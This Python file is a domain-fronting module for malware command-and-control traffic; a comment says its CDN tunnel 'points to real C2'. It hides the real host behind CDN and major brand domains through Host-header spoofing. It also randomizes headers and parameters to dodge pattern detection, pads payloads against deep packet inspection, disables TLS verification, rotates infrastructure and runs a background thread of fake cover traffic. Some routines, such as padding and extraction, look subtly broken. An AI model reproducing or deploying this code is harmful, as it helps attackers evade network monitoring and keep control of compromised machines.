"""
Domain Fronting Module
Advanced communication obfuscation through domain fronting and CDN masquerading
"""

import requests
import random
import time
import json
import base64
from typing import List, Dict, Optional, Tuple
from urllib.parse import urljoin
import threading
from datetime import datetime, timedelta

class DomainFronting:
    """Domain fronting and communication obfuscation"""
    
    def __init__(self):
        self.fronting_domains = [
            # CloudFront domains
            'd2.amazonaws.com',
            'd1.cloudfront.net', 
            'd2.cloudfront.net',
            'd3.cloudfront.net',
            'cloudfront.amazon.com',
            
            # CloudFlare domains
            'cloudflare.com',
            'cdnjs.cloudflare.com',
            'ajax.cloudflare.com',
            
            # Fastly domains
            'fastly.com',
            'global.fastly.com',
            'prod.fastly.com',
            
            # Azure CDN
            'azureedge.net',
            'windows.net',
            
            # Google CDN
            'googleapis.com',
            'gstatic.com',
            'googleusercontent.com',
            
            # Popular legitimate domains
            'microsoft.com',
            'office.com',
            'apple.com',
            'amazon.com',
            'facebook.com',
            'twitter.com',
            'google.com',
            'youtube.com'
        ]
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59'
        ]
        
        self.content_types = [
            'application/json',
            'application/x-www-form-urlencoded',
            'text/plain',
            'application/octet-stream',
            'multipart/form-data'
        ]
        
        self.active_sessions = {}
        self.rotation_interval = 300  # 5 minutes
        self.last_rotation = time.time()
        
    def get_random_fronting_domain(self) -> str:
        """Get random fronting domain"""
        return random.choice(self.fronting_domains)
        
    def get_random_user_agent(self) -> str:
        """Get random user agent"""
        return random.choice(self.user_agents)
        
    def create_fronted_request(self, real_host: str, real_path: str, data: Dict = None, method: str = 'GET') -> Optional[requests.Response]:
        """Create domain fronted request"""
        try:
            fronting_domain = self.get_random_fronting_domain()
            
            headers = {
                'Host': real_host,
                'User-Agent': self.get_random_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
            
            # Add random headers to look more legitimate
            if random.choice([True, False]):
                headers['Cache-Control'] = 'no-cache'
            if random.choice([True, False]):
                headers['Pragma'] = 'no-cache'
            if random.choice([True, False]):
                headers['DNT'] = '1'
                
            url = f"https://{fronting_domain}{real_path}"
            
            # Add random parameters to avoid pattern detection
            params = {}
            if random.choice([True, False]):
                params['t'] = str(int(time.time()))
            if random.choice([True, False]):
                params['r'] = str(random.randint(1000, 9999))
                
            session = requests.Session()
            
            if method.upper() == 'POST':
                if data:
                    # Encode data to look like legitimate traffic
                    if random.choice([True, False]):
                        headers['Content-Type'] = 'application/json'
                        json_data = json.dumps(data)
                        response = session.post(url, headers=headers, data=json_data, 
                                              params=params, timeout=30, verify=False)
                    else:
                        headers['Content-Type'] = 'application/x-www-form-urlencoded'
                        response = session.post(url, headers=headers, data=data, 
                                              params=params, timeout=30, verify=False)
                else:
                    response = session.post(url, headers=headers, params=params, 
                                          timeout=30, verify=False)
            else:
                response = session.get(url, headers=headers, params=params, 
                                     timeout=30, verify=False)
                
            return response
            
        except Exception as e:
            print(f"Domain fronting request failed: {e}")
            return None
            
    def send_with_multiple_fronts(self, real_host: str, real_path: str, data: Dict = None, 
                                 method: str = 'GET', retries: int = 3) -> Optional[requests.Response]:
        """Send request with multiple domain fronting attempts"""
        
        for attempt in range(retries):
            try:
                response = self.create_fronted_request(real_host, real_path, data, method)
                if response and response.status_code == 200:
                    return response
                    
                # Wait before retry with jitter
                time.sleep(random.uniform(1, 3))
                
            except Exception as e:
                print(f"Fronting attempt {attempt + 1} failed: {e}")
                
        return None
        
    def create_cdn_tunnel(self, real_host: str) -> str:
        """Create CDN tunnel configuration"""
        try:
            # Generate CDN configuration that points to real C2
            cdn_config = {
                'origin': real_host,
                'fronting_domains': random.sample(self.fronting_domains, 5),
                'rotation_schedule': self.rotation_interval,
                'fallback_domains': random.sample(self.fronting_domains, 3)
            }
            
            return base64.b64encode(json.dumps(cdn_config).encode()).decode()
            
        except Exception as e:
            print(f"CDN tunnel creation failed: {e}")
            return ""
            
    def obfuscate_traffic_pattern(self, data: bytes) -> bytes:
        """Obfuscate traffic patterns to avoid DPI"""
        try:
            # Add random padding
            padding_size = random.randint(10, 100)
            padding = bytes(random.randint(0, 255) for _ in range(padding_size))
            
            # Insert data at random position
            insert_pos = random.randint(0, len(padding) - len(data))
            obfuscated = padding[:insert_pos] + data + padding[insert_pos:]
            
            # Add markers for extraction
            marker = b'\xDE\xAD\xBE\xEF'
            size_marker = len(data).to_bytes(4, 'little')
            
            final_data = marker + size_marker + obfuscated
            
            return final_data
            
        except Exception as e:
            print(f"Traffic obfuscation failed: {e}")
            return data
            
    def extract_obfuscated_data(self, obfuscated: bytes) -> bytes:
        """Extract data from obfuscated traffic"""
        try:
            marker = b'\xDE\xAD\xBE\xEF'
            
            if not obfuscated.startswith(marker):
                return obfuscated
                
            # Extract size
            size_bytes = obfuscated[4:8]
            data_size = int.from_bytes(size_bytes, 'little')
            
            # Extract padding and find data
            padded_data = obfuscated[8:]
            
            # Find data within padding (simplified extraction)
            for i in range(len(padded_data) - data_size + 1):
                potential_data = padded_data[i:i + data_size]
                # Simple validation - in real implementation, add checksum
                if len(potential_data) == data_size:
                    return potential_data
                    
            return obfuscated
            
        except Exception as e:
            print(f"Data extraction failed: {e}")
            return obfuscated
            
    def create_legitimate_cover_traffic(self) -> None:
        """Generate legitimate-looking cover traffic"""
        try:
            def generate_traffic():
                while True:
                    try:
                        # Random legitimate requests
                        legitimate_sites = [
                            'https://www.microsoft.com/en-us/microsoft-365',
                            'https://docs.microsoft.com/en-us/',
                            'https://www.office.com',
                            'https://login.microsoftonline.com',
                            'https://www.google.com/search?q=weather',
                            'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
                            'https://github.com/trending',
                            'https://stackoverflow.com/questions'
                        ]
                        
                        site = random.choice(legitimate_sites)
                        headers = {
                            'User-Agent': self.get_random_user_agent(),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.5',
                            'Accept-Encoding': 'gzip, deflate',
                            'Connection': 'keep-alive'
                        }
                        
                        response = requests.get(site, headers=headers, timeout=10, verify=False)
                        
                        # Random delay between requests
                        time.sleep(random.uniform(30, 300))  # 30 seconds to 5 minutes
                        
                    except Exception:
                        time.sleep(60)  # Wait before retry
                        
            # Start background cover traffic
            traffic_thread = threading.Thread(target=generate_traffic, daemon=True)
            traffic_thread.start()
            
        except Exception as e:
            print(f"Cover traffic generation failed: {e}")
            
    def rotate_infrastructure(self) -> None:
        """Rotate fronting infrastructure"""
        try:
            current_time = time.time()
            
            if current_time - self.last_rotation > self.rotation_interval:
                # Shuffle fronting domains
                random.shuffle(self.fronting_domains)
                
                # Clear old sessions
                self.active_sessions.clear()
                
                self.last_rotation = current_time
                print("Infrastructure rotated")
                
        except Exception as e:
            print(f"Infrastructure rotation failed: {e}")
            
    def test_fronting_domains(self) -> List[str]:
        """Test which fronting domains are working"""
        working_domains = []
        
        for domain in self.fronting_domains:
            try:
                headers = {
                    'Host': 'www.google.com',  # Test with Google
                    'User-Agent': self.get_random_user_agent()
                }
                
                url = f"https://{domain}/"
                response = requests.get(url, headers=headers, timeout=5, verify=False)
                
                if response.status_code in [200, 301, 302, 403]:
                    working_domains.append(domain)
                    
            except Exception:
                continue
                
        return working_domains
        
    def adaptive_fronting(self, real_host: str, real_path: str, data: Dict = None) -> Optional[requests.Response]:
        """Adaptive domain fronting with fallbacks"""
        try:
            # Test current domains
            working_domains = self.test_fronting_domains()
            
            if not working_domains:
                print("No working fronting domains found")
                return None
                
            # Try each working domain
            for domain in working_domains:
                try:
                    headers = {
                        'Host': real_host,
                        'User-Agent': self.get_random_user_agent(),
                        'Accept': 'application/json, text/plain, */*',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Connection': 'keep-alive'
                    }
                    
                    url = f"https://{domain}{real_path}"
                    
                    if data:
                        response = requests.post(url, headers=headers, json=data, 
                                               timeout=15, verify=False)
                    else:
                        response = requests.get(url, headers=headers, timeout=15, verify=False)
                        
                    if response.status_code == 200:
                        return response
                        
                except Exception as e:
                    continue
                    
            return None
            
        except Exception as e:
            print(f"Adaptive fronting failed: {e}")
            return None
